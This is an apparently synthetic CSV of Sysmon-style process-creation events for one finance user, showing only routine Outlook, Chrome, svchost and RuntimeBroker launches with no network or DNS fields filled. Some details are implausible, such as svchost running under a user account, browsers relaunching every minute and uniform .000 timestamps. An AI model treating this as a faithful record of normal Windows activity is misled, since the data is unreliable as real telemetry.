UtcTime,EventID,Image,ParentImage,User,CommandLine,TargetImage,DestinationIp,QueryName
2026-05-11 08:30:19.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:30:42.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:31:19.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:31:23.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:31:41.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:31:57.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:32:36.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:33:02.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:33:18.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:33:28.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:34:07.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:34:44.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:34:50.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:35:03.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:35:28.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:36:04.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:36:34.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:37:04.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:37:10.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:37:34.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:38:14.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:38:34.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:38:50.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:38:54.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:39:06.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:39:32.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:39:58.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:40:03.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:40:32.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:41:02.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:41:41.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:41:50.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:42:29.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:42:46.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:43:00.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:43:20.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:43:40.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:43:46.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:44:21.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:44:31.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:45:05.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:45:17.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:45:54.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:46:31.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:46:54.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:47:29.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:48:08.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:48:22.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:48:38.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:48:44.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:48:58.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:49:33.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:50:11.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:50:29.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:50:59.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:51:35.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:51:38.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:51:44.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:51:52.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:51:56.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:52:14.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:52:36.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:53:11.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:53:32.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:53:52.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:54:27.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:54:52.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:55:23.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:55:38.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:55:42.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:55:54.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:56:14.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:56:31.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:56:35.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:57:05.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:57:26.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
